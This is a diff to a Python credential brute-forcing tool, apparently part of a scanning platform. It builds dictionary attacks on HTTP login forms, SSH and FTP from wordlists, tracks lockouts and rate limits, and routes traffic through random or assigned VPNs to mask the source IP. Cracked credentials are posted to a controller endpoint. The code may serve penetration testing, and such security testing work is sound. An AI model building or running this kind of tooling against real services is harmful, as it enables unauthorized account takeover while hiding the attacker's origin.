@@ -21,18 +21,123 @@ import requests
 from bs4 import BeautifulSoup
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
+from vpn_manager import VPNManager
+
+# Configure concise logger (match dns_lookup style)
+import logging
+logger = logging.getLogger("bruteforce")
+if not logger.handlers:
+    h = logging.StreamHandler(stream=sys.stdout)
+    h.setFormatter(logging.Formatter("[BF] %(levelname)s: %(message)s"))
+    logger.addHandler(h)
+    logger.setLevel(logging.INFO)
 
 
 # -------------------------- util chung --------------------------
 
 def read_job():
-    """Đọc job từ file (BF_JOB_FILE) hoặc stdin. Chấp nhận BOM."""
+    """Đọc job từ file (BF_JOB_FILE), SCAN_OPTIONS, hoặc stdin. Chấp nhận BOM."""
+    # 1. Kiểm tra SCAN_OPTIONS từ controller trước
+    scan_options_str = os.environ.get("SCAN_OPTIONS")
+    if scan_options_str:
+        try:
+            scan_options = json.loads(scan_options_str)
+            # Nếu có job_json_content từ controller, parse nó
+            job_json_content = scan_options.get("job_json_content")
+            if job_json_content:
+                logger.info("Reading job from job_json_content in SCAN_OPTIONS")
+                return json.loads(job_json_content)
+            # Nếu không có job_json_content, tạo job từ manual parameters
+            else:
+                logger.info("Creating job from manual parameters in SCAN_OPTIONS")
+                return create_job_from_options(scan_options)
+        except Exception as e:
+            logger.warning(f"Failed to parse SCAN_OPTIONS: {e}, falling back to file/stdin")
+    
+    # 2. Fallback: đọc từ file
     fp = os.environ.get("BF_JOB_FILE")
     if fp and os.path.exists(fp):
         with open(fp, "r", encoding="utf-8-sig") as f:  # chấp nhận BOM
             return json.load(f)
+    
+    # 3. Fallback: đọc từ stdin
     data = sys.stdin.buffer.read().decode("utf-8-sig")
     return json.loads(data)
+
+
+def create_job_from_options(options):
+    """Tạo bruteforce job từ manual parameters của controller"""
+    # Extract manual parameters từ dashboard form
+    strategy = options.get("strategy", "dictionary")
+    protocol = options.get("protocol", "http_form")
+    
+    # Tạo basic job structure
+    job = {
+        "strategy": strategy,
+        "limits": {
+            "concurrency": int(options.get("concurrency", 2)),
+            "rate_per_min": int(options.get("rate_per_min", 10)),
+            "timeout_sec": int(options.get("timeout_sec", 15)),
+            "max_attempts_per_target": int(options.get("max_attempts", 1000)),
+            "stop_on_success": bool(options.get("stop_on_success", True))
+        },
+        "wordlists": {},
+        "targets": []
+    }
+    
+    # Setup wordlists paths
+    if options.get("username_list"):
+        job["wordlists"]["users"] = f"/app/wordlists/{options['username_list']}"
+    if options.get("password_list"):
+        job["wordlists"]["passwords"] = f"/app/wordlists/{options['password_list']}"
+    if options.get("pair_list"):
+        job["wordlists"]["pairs"] = f"/app/wordlists/{options['pair_list']}"
+    
+    # Setup targets based on protocol
+    targets_from_env = os.getenv("TARGETS", "").split(",")
+    for target_str in targets_from_env:
+        if not target_str.strip():
+            continue
+        target = {"protocol": protocol}
+        
+        if protocol == "http_form":
+            # Parse target URL
+            target["url"] = target_str.strip()
+            target["http"] = {
+                "url": target_str.strip(),
+                "method": options.get("http_method", "POST"),
+                "content_type": options.get("http_content_type", "form"),
+                "body_template": options.get("http_body_template", "username=§USER§&password=§PASS§"),
+                "success": {
+                    "any": [{"location_regex": options.get("success_location_regex", "dashboard|home|welcome")}]
+                },
+                "failure": {
+                    "body_regex": options.get("failure_body_regex", "invalid|incorrect|failed")
+                }
+            }
+        elif protocol == "ssh":
+            # Parse host:port
+            if ":" in target_str:
+                host, port = target_str.split(":", 1)
+                target["host"] = host.strip()
+                target["port"] = int(port.strip())
+            else:
+                target["host"] = target_str.strip()
+                target["port"] = 22
+        elif protocol == "ftp":
+            # Parse host:port
+            if ":" in target_str:
+                host, port = target_str.split(":", 1)
+                target["host"] = host.strip()
+                target["port"] = int(port.strip())
+            else:
+                target["host"] = target_str.strip()
+                target["port"] = 21
+            target["tls"] = options.get("ftp_tls", "plain")
+        
+        job["targets"].append(target)
+    
+    return job
 
 
 def load_lines(path):
@@ -394,7 +499,7 @@ def generate_attempts(strategy, users, passwords, pairs):
     return out
 
 
-def run_target(target, users, passwords, pairs, limits, findings, counters, stop_flag):
+def run_target(target, users, passwords, pairs, limits, findings, counters, stop_flag, strategy):
     proto = target.get("protocol")
     rate_per_min = limits.get("rate_per_min")
     jitter = limits.get("jitter_ms")
@@ -412,7 +517,6 @@ def run_target(target, users, passwords, pairs, limits, findings, counters, stop
         counters["errors"] += 1
         return
 
-    strategy = job.get("strategy", "dictionary")
     attempts = generate_attempts(strategy, users, passwords, pairs)[:max_attempts]
 
     tested_here = 0
@@ -457,60 +561,190 @@ def run_target(target, users, passwords, pairs, limits, findings, counters, stop
 # -------------------------- main --------------------------
 
 if __name__ == "__main__":
-    job = read_job()
+    logger.info("Starting Bruteforce scan with VPN")
 
-    users = load_lines(job.get("wordlists", {}).get("users"))
-    passwords = load_lines(job.get("wordlists", {}).get("passwords"))
-    pairs = load_pairs(job.get("wordlists", {}).get("pairs"))
+    # Setup VPN trước khi scan (copy logic từ dns_lookup.py)
+    vpn_manager = VPNManager()
+    vpn_connected = False
+    network_info = {}
 
-    limits = job.get("limits", {}) or {}
-    concurrency = int(limits.get("concurrency", 1))
-    targets = job.get("targets", [])
+    # Lấy VPN assignment từ Controller (nếu có)
+    assigned_vpn = None
+    controller_url = os.getenv("CONTROLLER_CALLBACK_URL")
+    vpn_assignment = os.getenv("VPN_ASSIGNMENT")  # VPN được assign từ Controller
+    job_id = os.getenv("JOB_ID")
+    workflow_id = os.getenv("WORKFLOW_ID")
 
-    q = Queue()
-    for t in targets:
-        q.put(t)
+    if vpn_assignment:
+        try:
+            assigned_vpn = json.loads(vpn_assignment)
+            logger.info(f"Received VPN assignment: {assigned_vpn.get('hostname', 'Unknown')}")
+        except json.JSONDecodeError as e:
+            logger.warning(f"Failed to parse VPN assignment: {e}")
 
-    findings = []
-    counters = {"tested": 0, "errors": 0, "lockout": 0, "rate_limited": 0, "need_2fa": 0}
-    stop_flag = {"stop": False}
+    vpn_profile_info = None
+    # Thử setup VPN (optional - có thể skip nếu proxy server không available)
+    try:
+        logger.debug("Checking initial network status")
+        initial_info = vpn_manager.get_network_info()
+        logger.debug(f"Initial IP: {initial_info['public_ip']}")
 
-    def worker():
-        while not q.empty():
+        # Sử dụng assigned VPN nếu có, nếu không thì dùng random
+        if assigned_vpn:
+            meta = vpn_manager.setup_specific_vpn(assigned_vpn)
+            if meta:
+                logger.info("Connected to assigned VPN")
+                vpn_manager.print_vpn_status()
+                network_info = vpn_manager.get_network_info()
+                vpn_connected = True
+                vpn_profile_info = meta
+            else:
+                logger.info("Failed to connect to assigned VPN, will try random")
+
+        if not vpn_connected:
+            logger.info("No VPN assignment from Controller or failed, using random VPN")
+            meta = vpn_manager.setup_random_vpn()
+            if meta:
+                logger.info("VPN setup completed")
+                vpn_manager.print_vpn_status()
+                network_info = vpn_manager.get_network_info()
+                vpn_connected = True
+                vpn_profile_info = meta
+            else:
+                logger.info("VPN connection failed, continuing without VPN")
+
+        # Gửi thông báo connect VPN về controller nếu kết nối thành công
+        if vpn_connected and controller_url and vpn_profile_info:
             try:
-                tgt = q.get_nowait()
-            except Exception:
-                break
-            try:
-                run_target(tgt, users, passwords, pairs, limits, findings, counters, stop_flag)
-            finally:
-                q.task_done()
+                payload = {"action": "connect", "scanner_id": job_id}
+                if vpn_profile_info.get("filename"):
+                    payload["filename"] = vpn_profile_info["filename"]
+                logger.info(f"Notify controller connect: {payload}")
+                resp = requests.post(f"{controller_url}/api/vpn_profiles/update", json=payload, timeout=10)
+                logger.debug(f"Controller connect response: {resp.status_code}")
+            except Exception as notify_err:
+                logger.warning(f"Failed to notify controller connect: {notify_err}")
+    except Exception as e:
+        logger.warning(f"VPN setup error: {e}, continuing without VPN...")
 
-    threads = []
-    for _ in range(max(1, concurrency)):
-        t = threading.Thread(target=worker, daemon=True)
-        t.start()
-        threads.append(t)
-    for t in threads:
-        t.join()
+    try:
+        job = read_job()
 
-    out = {
-        "job_id": job.get("job_id"),
-        "result_version": "1.1",
-        "summary": {
-            "tested": counters["tested"],
-            "valid_found": len(findings),
-            "errors": counters["errors"],
-            "lockout": counters["lockout"],
-            "rate_limited": counters["rate_limited"],
-            "need_2fa": counters["need_2fa"]
-        },
-        "findings": findings,
-        "telemetry": {
-            "strategy": job.get("strategy"),
-            "concurrency": limits.get("concurrency"),
-            "rate_per_min": limits.get("rate_per_min"),
-            "jitter_ms": limits.get("jitter_ms")
+        users = load_lines(job.get("wordlists", {}).get("users"))
+        passwords = load_lines(job.get("wordlists", {}).get("passwords"))
+        pairs = load_pairs(job.get("wordlists", {}).get("pairs"))
+
+        limits = job.get("limits", {}) or {}
+        concurrency = int(limits.get("concurrency", 1))
+        targets = job.get("targets", [])
+        strategy = job.get("strategy", "dictionary")
+
+        logger.info(f"Bruteforce starting for {len(targets)} targets with strategy: {strategy}")
+
+        q = Queue()
+        for t in targets:
+            q.put(t)
+
+        findings = []
+        counters = {"tested": 0, "errors": 0, "lockout": 0, "rate_limited": 0, "need_2fa": 0}
+        stop_flag = {"stop": False}
+
+        def worker():
+            while not q.empty():
+                try:
+                    tgt = q.get_nowait()
+                except Exception:
+                    break
+                try:
+                    run_target(tgt, users, passwords, pairs, limits, findings, counters, stop_flag, strategy)
+                finally:
+                    q.task_done()
+
+        threads = []
+        for _ in range(max(1, concurrency)):
+            t = threading.Thread(target=worker, daemon=True)
+            t.start()
+            threads.append(t)
+        for t in threads:
+            t.join()
+
+        # Tạo output results
+        out = {
+            "job_id": job.get("job_id"),
+            "result_version": "1.1",
+            "summary": {
+                "tested": counters["tested"],
+                "valid_found": len(findings),
+                "errors": counters["errors"],
+                "lockout": counters["lockout"],
+                "rate_limited": counters["rate_limited"],
+                "need_2fa": counters["need_2fa"]
+            },
+            "findings": findings,
+            "telemetry": {
+                "strategy": strategy,
+                "concurrency": limits.get("concurrency"),
+                "rate_per_min": limits.get("rate_per_min"),
+                "jitter_ms": limits.get("jitter_ms")
+            }
         }
-    }
-    print(json.dumps(out, ensure_ascii=False))
+
+        # Gửi kết quả về Controller nếu có callback URL
+        if controller_url:
+            try:
+                has_findings = bool(findings)
+                target_list = [f"{t.get('host', '')}:{t.get('port', '')}" for t in targets[:5]]  # First 5 targets
+                payload = {
+                    "target": ','.join(target_list) if target_list else "bruteforce-scan",
+                    "resolved_ips": [],
+                    "open_ports": [],
+                    "workflow_id": workflow_id,
+                    "has_findings": has_findings,
+                    "scan_metadata": {
+                        "tool": "bruteforce",
+                        "job_id": job_id,
+                        "vpn_used": vpn_connected,
+                        "scan_ip": network_info.get("public_ip", "Unknown"),
+                        "vpn_local_ip": network_info.get("local_ip"),
+                        "tun_interface": network_info.get("tun_interface", False),
+                        "strategy": strategy,
+                        "total_targets": len(targets),
+                        "total_attempts": counters["tested"],
+                        "credentials_found": len(findings),
+                        "lockouts": counters["lockout"],
+                        "rate_limited": counters["rate_limited"],
+                        "findings_summary": findings[:3] if findings else []  # First 3 findings
+                    },
+                    "bruteforce_results": {
+                        "summary": out["summary"],
+                        "findings": findings
+                    }
+                }
+                logger.debug(f"Sending result to Controller: {payload}")
+                response = requests.post(f"{controller_url}/api/scan_results", json=payload)
+                logger.debug(f"Controller response: {response.status_code}")
+            except Exception as e:
+                logger.warning(f"Error sending results to Controller: {e}")
+
+        print(json.dumps(out, ensure_ascii=False))
+        logger.info("Bruteforce scan completed")
+
+    except Exception as e:
+        logger.warning(f"Scan error: {e}")
+
+    finally:
+        # Gửi thông báo disconnect VPN về controller nếu đã connect VPN
+        if vpn_connected and controller_url and vpn_profile_info:
+            try:
+                payload = {"action": "disconnect", "scanner_id": job_id}
+                if vpn_profile_info.get("filename"):
+                    payload["filename"] = vpn_profile_info["filename"]
+                logger.info(f"Notify controller disconnect: {payload}")
+                resp = requests.post(f"{controller_url}/api/vpn_profiles/update", json=payload, timeout=10)
+                logger.debug(f"Controller disconnect response: {resp.status_code}")
+            except Exception as notify_err:
+                logger.warning(f"Failed to notify controller disconnect: {notify_err}")
+        # Cleanup VPN
+        if vpn_connected:
+            logger.info("Disconnecting VPN")
+            vpn_manager.disconnect_vpn()
